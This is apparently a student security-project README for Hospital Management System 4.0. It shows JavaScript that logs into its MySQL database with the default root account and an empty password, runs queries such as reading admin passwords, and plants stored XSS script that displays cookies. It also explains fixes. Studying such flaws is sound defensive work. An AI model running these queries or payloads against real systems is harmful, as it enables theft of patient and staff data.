# Information Security Project

Table of contents:
 - Introduction
 - Hospital Management System 4.0
 - Vulnerabilities
    - Insecure database
    - XSS attacks
- Damages
- References

## Introduction
The aim of this project is to identify a vulnerability and to write an application which performs a penetration test.
This application was build whit the basic knowledge of:
- HTML
- JavaScript
- MySql
- XSS-Attacks

The exploite I've chosen for this project is listet at the references part of this report.
To see how to get started please have a look at the file "Instructions.md".

## Hospital Management System 4.0
phpgurukul:
> Hospital Management System is a web application for the hospital which manages doctors and patients.

The sofware is based on php and uses a MySQL database.
The software offers 3 different modules which are the following:
- Admin module
- User module
- Doctor module

Each module has access to different tasks which are important for every hospital.
One of the most important tasks is the storage of personal informations of each patient.
This data is also the most interesting data for hackers.

## Vulnerabilities of the Software

### Insecure database
We already encounter the first vulnerability of the application when we've done the setup. 
As you may have noticed, you were not asked to change the security settings at any stage of 
the database setup. So it is possible for everyone on the installation server to read the database 
data with simple SQL script.
Due to this security hole it is possible to perform any action, e.g. change the admin password, 
read out the patient data or delete the entire data. 
To perform such actions it is sufficient to connect to the database with the standard authentication data:
- Username: "root"
- Password: ""

It should also be noted that the names of the tables are very easy to consult. These should be obfuscated.
Furthermore, confidential data such as passwords are not encrypted but simply stored as plain text. Here the already 
integrated function for password encryption of MySQL databases should be used.

It is also shocking that the queries to the database are integrated directly in the HTML 
and are therefore visible for all those who are familiar with the browser development tools. 
These queries should be provided in an external file. 

#### Examples from project

##### Create database connection
The following piece of code shows how to create a databse connection in JavaScript.
All you need to know for this are the standard authentication data and the name of the 
database which we know already from the setup.
``` JavaScript
function getDatabaseConnection() {
	const mysql = require('mysql');

	return mysql.createConnection({
		host: "localhost",
		user: "root",
		password: "",
		database: "hms"
	});
}
```
##### Execute a SQL query
The following code shows how to execute a SQL query.
Additionally if the flag "open" is set to true it opens
the browser with the link to one of the vulnerable sites.
An example for a query could be:
```SELECT password FROM admin```

``` JavaScript
function executeQuery(sql, open = false) {
	const con = getDatabaseConnection();
	con.connect(function (err) {
		if (err) console.log("There went somthing wrong! Please try again!", newLine);
		con.query(sql, function (err, result) {
			if (err) console.log("There went somthing wrong! Please try again!", newLine);
			if (open) {
				var opn = require('opn');
				opn('http://localhost/hospital/hms/admin/doctor-specilization.php');
			}
			else
				console.log(result)
			main();
		});
	});
}
```
#### Solution
The solution to this problem is quite simple.
It would be enough to show the user how to set up the security settings of the databse
and how to change this settings also in the given php project.
An other solution would be to provide a service which sets up the environment for the client.

### XSS Attacks
Most of the input fields of the application are vulnerable to XSS attacks.
One of this fields is the field "doctorspecilization". Using basic knowledge of XSS attacks, html tables and JavaScript
you are able to add a XSS atack to the database.
Here is an example of the payload what you need to enter: ```</td><script>alert("Hello! I am a XSS attack")<script><td>````

#### Why does this work?
First of all it works because there is no check on the backend site for the input values.
The paylode we see above works because the application uses a simple html table to display the list of doctor specilizations.
Explanation of the payload:
- ```</td>```closes the cell of the table.
- ```<script></script>``` allows you to execute JavaScript.
- ```alert("Hello! I am a XSS attack")``` shows a small popup with the message "Hello! I am a XSS attack".
- ```<td>``` opens the next cell of the table to avoid an html parsing error.

#### Examples from project
Unfortunately my JavaScript basics were not good enough to create a valid HTTP request of the type "POST".
This request always ended with the server not giving me a response after I added the payload to the request. 
This could be because of security measures of the tested software or a bug on my part.
To automate the part of the XSS attack I used the vulnerabilities of the database and stored the attack directly 
into the database instead of using a HTTP request.

The following code asks the user to make a few decisions first. These decisions will determine how exactly the XSS 
attack looks like. Then the XSS attack is assembled according to the user's wishes and written to the database using 
the functions we have already seen in the previous section. This makes it possible to display the cookies, for example.  

``` JavaScript
function addXSS() {
	askForInput();
	showXSSOutputOptions();
	const outputFun = readUserInput("Please enter the output function you want to use");
	const outputMsg = readUserInput("Please enter the message you want to show or type 'cookie' if you want to see the cookies: ");
	let msg;
	let query;
	switch (outputFun) {
		case "1":
			msg = outputMsg == "cookie" ? "document.cookie" : outputMsg;
			query = `INSERT INTO doctorspecilization (specilization) VALUES ('</td><script>alert(${msg});</script><td>')`;
			executeQuery(query, true);
			break;
		case "2":
			msg = outputMsg == "cookie" ? "document.cookie" : outputMsg;
			query = `INSERT INTO doctorspecilization (specilization) VALUES ('</td><script>console.log(${msg});</script><td>')`;
			executeQuery(query, true);
		break;
		default:
			console.log("Please enter a valid input!");
			addXSS();
			break;
	}
}
```

#### Solution
To prevent a XSS attack on input fields you have to sanitize the input of the user.
You also have to pay attention where you put this input because even if you filter the 
input of the user there is no sanitazion method which is able to prevent to all XSS attacks.
One of the functions you have to remember when creating a php project with user input is
```htmlspecialchars()```. This function will convert special characters into HTML entities.

Another useful function is ```addslashes()```. This function adds slashes in attempt to prevent 
an attacker from terminating the variable assignment and appending executable code.

These are just a few basic precautions that are usually not sufficient to prevent all XSS attacks. 
A very detailed description how to prevent XSS attacks can be found [here](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

## Damages
A hacker attack on hospital software would naturally have serious consequences. The database contains 
private information of patients and hospital staff. Furthermore, the patients' appointments are also 
managed by this software. Such data is strictly confidential and should never fall into the wrong hands.

## References
You can find the expoit [here](https://www.exploit-db.com/exploits/47841).